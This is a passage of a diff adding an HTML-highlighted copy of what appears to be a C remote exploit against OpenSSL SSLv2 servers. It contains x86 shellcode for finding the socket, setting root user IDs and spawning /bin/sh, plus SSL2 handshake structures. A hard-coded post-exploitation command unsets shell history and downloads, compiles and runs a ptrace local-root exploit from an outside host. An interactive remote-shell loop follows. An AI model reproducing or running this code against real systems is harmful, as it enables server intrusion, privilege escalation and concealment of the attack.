+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x74\x02"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;findsckcode+56&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xe2\xe0"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;loop&nbsp;&nbsp;&nbsp;&nbsp;&lt;findsckcode+24&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x89\xcb"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;%ecx,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x31\xc9"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;xorl&nbsp;&nbsp;&nbsp;&nbsp;%ecx,%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xb1\x03"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movb&nbsp;&nbsp;&nbsp;&nbsp;$0x03,%cl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x31\xc0"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;xorl&nbsp;&nbsp;&nbsp;&nbsp;%eax,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xb0\x3f"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movb&nbsp;&nbsp;&nbsp;&nbsp;$0x3f,%al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x49"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;decl&nbsp;&nbsp;&nbsp;&nbsp;%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xcd\x80"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x41"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;incl&nbsp;&nbsp;&nbsp;&nbsp;%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xe2\xf6"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;loop&nbsp;&nbsp;&nbsp;&nbsp;&lt;findsckcode+62&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;10&nbsp;byte&nbsp;setresuid(0,0,0);&nbsp;by&nbsp;core&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x31\xc9"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;%ecx,%ecx&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xf7\xe1"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;mul&nbsp;&nbsp;&nbsp;&nbsp;%ecx,%eax&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x51"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;push&nbsp;&nbsp;&nbsp;%ecx&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x5b"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;%ebx&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xb0\xa4"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0xa4,%al&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xcd\x80"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;$0x80&nbsp;*/</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;bigger&nbsp;shellcode&nbsp;added&nbsp;by&nbsp;spabam&nbsp;*/</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;"\xB8\x2F\x73\x68\x23\x25\x2F\x73\x68\xDC\x50\x68\x2F\x62\x69"<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"\x6E\x89\xE3\x31\xC0\x50\x53\x89\xE1\x04\x0B\x31\xD2\xCD\x80"<br>
+                */</span><br>
+                <br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;24&nbsp;bytes&nbsp;execl("/bin/sh",&nbsp;"/bin/sh",&nbsp;0);&nbsp;by&nbsp;LSD-pl&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x31\xc0"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;xorl&nbsp;&nbsp;&nbsp;&nbsp;%eax,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x50"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;pushl&nbsp;&nbsp;&nbsp;%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x68""//sh"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;pushl&nbsp;&nbsp;&nbsp;$0x68732f2f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x68""/bin"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;pushl&nbsp;&nbsp;&nbsp;$0x6e69622f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x89\xe3"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;%esp,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x50"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;pushl&nbsp;&nbsp;&nbsp;%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x53"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;pushl&nbsp;&nbsp;&nbsp;%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x89\xe1"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;%esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x99"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;cdql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xb0\x0b"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movb&nbsp;&nbsp;&nbsp;&nbsp;$0x0b,%al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xcd\x80"</span>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;read&nbsp;and&nbsp;write&nbsp;buffer*/</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;BUFSIZE&nbsp;16384</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;hardcoded&nbsp;protocol&nbsp;stuff&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;CHALLENGE_LENGTH&nbsp;16</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;RC4_KEY_LENGTH&nbsp;16 /*&nbsp;128&nbsp;bits&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;RC4_KEY_MATERIAL_LENGTH&nbsp;(RC4_KEY_LENGTH*2)</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;straight&nbsp;from&nbsp;the&nbsp;openssl&nbsp;source&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;n2s(c,s)&nbsp;&nbsp;&nbsp;&nbsp;((s=(((unsigned&nbsp;int)(c[0]))&lt;&lt;&nbsp;8)|&nbsp;(((unsigned&nbsp;int)(c[1]))&nbsp;&nbsp;&nbsp;&nbsp;)),c+=2)</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;s2n(s,c)&nbsp;&nbsp;&nbsp;&nbsp;((c[0]=(unsigned&nbsp;char)(((s)&gt;&gt;&nbsp;8)&amp;0xff),&nbsp;c[1]=(unsigned&nbsp;char)(((s)&nbsp;&nbsp;&nbsp;&nbsp;)&amp;0xff)),c+=2)</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;we&nbsp;keep&nbsp;all&nbsp;SSL2&nbsp;state&nbsp;in&nbsp;this&nbsp;structure&nbsp;*/</span><br>
+                <span style="color:#ff9d00;font-weight:700">typedef</span>&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;{<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;sock;<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;client&nbsp;stuff&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;challenge[CHALLENGE_LENGTH];<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;master_key[RC4_KEY_LENGTH];<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;key_material[RC4_KEY_MATERIAL_LENGTH];<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;connection&nbsp;id&nbsp;-&nbsp;returned&nbsp;by&nbsp;the&nbsp;server&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;conn_id_length;<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;server&nbsp;certificate&nbsp;*/</span><br>
+                X509&nbsp;*x509;<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;session&nbsp;keys&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;read_key;<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;write_key;<br>
+                RC4_KEY*&nbsp;rc4_read_key;<br>
+                RC4_KEY*&nbsp;rc4_write_key;<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;sequence&nbsp;numbers,&nbsp;used&nbsp;for&nbsp;MAC&nbsp;calculation&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;read_seq;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;write_seq;<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;set&nbsp;to&nbsp;1&nbsp;when&nbsp;the&nbsp;SSL2&nbsp;handshake&nbsp;is&nbsp;complete&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;encrypted;<br>
+                }&nbsp;ssl_conn;<br>
+                <br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;COMMAND1&nbsp;"TERM=xterm;&nbsp;export&nbsp;TERM=xterm;&nbsp;exec&nbsp;bash&nbsp;-i\n"</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;COMMAND2&nbsp;"unset&nbsp;HISTFILE;&nbsp;cd&nbsp;/tmp;&nbsp;wget&nbsp;https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c;&nbsp;gcc&nbsp;-o&nbsp;p&nbsp;ptrace-kmod.c;&nbsp;rm&nbsp;ptrace-kmod.c;&nbsp;./p;&nbsp;\n"</span><br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">long</span>&nbsp;getip(<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*hostname)&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;hostent&nbsp;*he;<br>
+                <span style="color:#7f0044;font-weight:400">long</span>&nbsp;ipaddr;<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((ipaddr&nbsp;=&nbsp;inet_addr(hostname))&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((he&nbsp;=&nbsp;gethostbyname(hostname))&nbsp;==&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>)&nbsp;{<br>
+                perror(<span style="color:#3ad900;font-weight:400">"gethostbyname()"</span>);<br>
+                exit(-<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                memcpy(&amp;ipaddr,&nbsp;he-&gt;h_addr,&nbsp;he-&gt;h_length);<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;ipaddr;<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;mixter's&nbsp;code&nbsp;w/enhancements&nbsp;by&nbsp;core&nbsp;*/</span><br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;sh(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;sockfd)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;snd[<span style="color:#ff0044;font-weight:400">1024</span>],&nbsp;rcv[<span style="color:#ff0044;font-weight:400">1024</span>];<br>
+                &nbsp;&nbsp;&nbsp;fd_set&nbsp;rset;<br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;maxfd,&nbsp;n;<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;Priming&nbsp;commands&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;strcpy(snd,&nbsp;COMMAND1&nbsp;<span style="color:#3ad900;font-weight:400">"\n"</span>);<br>
+                &nbsp;&nbsp;&nbsp;write(sockfd,&nbsp;snd,&nbsp;strlen(snd));<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;strcpy(snd,&nbsp;COMMAND2&nbsp;<span style="color:#3ad900;font-weight:400">"\n"</span>);<br>
+                &nbsp;&nbsp;&nbsp;write(sockfd,&nbsp;snd,&nbsp;strlen(snd));<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;Main&nbsp;command&nbsp;loop&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;(;;)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FD_SET(fileno(stdin),&nbsp;&amp;rset);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FD_SET(sockfd,&nbsp;&amp;rset);<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;maxfd&nbsp;=&nbsp;(&nbsp;(&nbsp;fileno(stdin)&nbsp;&gt;&nbsp;sockfd&nbsp;)?fileno(stdin):sockfd&nbsp;)&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span>;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;select(maxfd,&nbsp;&amp;rset,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>);<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(FD_ISSET(fileno(stdin),&nbsp;&amp;rset))&nbsp;{<br>
+                &nbsp;bzero(snd,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(snd));<br>
+                &nbsp;fgets(snd,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(snd)-<span style="color:#ff0044;font-weight:400">2</span>,&nbsp;stdin);<br>
+                &nbsp;write(sockfd,&nbsp;snd,&nbsp;strlen(snd));<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(FD_ISSET(sockfd,&nbsp;&amp;rset))&nbsp;{<br>
+                &nbsp;bzero(rcv,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(rcv));<br>
+                <br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((n&nbsp;=&nbsp;read(sockfd,&nbsp;rcv,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(rcv)))&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"Good&nbsp;Bye!\n"</span>);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>
+                &nbsp;}<br>
+                <br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(n&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;perror(<span style="color:#3ad900;font-weight:400">"read"</span>);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">1</span>;<br>
+                &nbsp;}<br>
+                <br>
+                &nbsp;fputs(rcv,&nbsp;stdout);<br>
+                &nbsp;fflush(stdout);&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;keeps&nbsp;output&nbsp;nice&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                &nbsp;&nbsp;&nbsp;}&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;for(;;)&nbsp;*/</span><br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;Returns&nbsp;the&nbsp;local&nbsp;port&nbsp;of&nbsp;a&nbsp;connected&nbsp;socket&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;get_local_port(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;sock)<br>
+                {<br>
+                <span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr_in&nbsp;s_in;<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;namelen&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(s_in);<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(getsockname(sock,&nbsp;(<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr&nbsp;*)&amp;s_in,&nbsp;&amp;namelen)&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Can't&nbsp;get&nbsp;local&nbsp;port:&nbsp;%s\n"</span>,&nbsp;strerror(errno));<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;s_in.sin_port;<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;Connect&nbsp;to&nbsp;a&nbsp;host&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;connect_host(<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;host,&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;port)<br>
+                {<br>
+                <span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr_in&nbsp;s_in;<br>
